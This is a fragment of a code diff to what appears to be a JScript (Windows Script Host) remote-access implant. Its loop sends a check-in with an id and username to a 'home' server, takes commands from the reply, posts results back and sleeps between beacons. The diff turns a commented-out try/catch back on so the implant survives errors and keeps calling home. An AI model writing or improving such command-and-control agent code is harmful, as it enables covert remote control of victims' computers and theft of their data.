@@ -121,8 +121,8 @@ function b64d(data) {
 //Main
 while(true)
 {
-  //try
-  //{
+  try
+  {
     var checkin = '{"type": "'+type+'","id": '+id+',"un": "'+un+'"}';
     var serverMsg = post(home, checkin);
 	  var jsondata = "{" + serverMsg.split("{")[1].split("\n")[0]
@@ -202,10 +202,10 @@ while(true)
       jsObject.cmnd = ""
       post(home, resp)
     }
-  //}
-  //catch (e) {
-  //  WScript.Sleep(sleepytime);
-  //}
+  }
+  catch (e) {
+    WScript.Sleep(sleepytime);
+  }
   WScript.Sleep(sleepytime);
 }
 
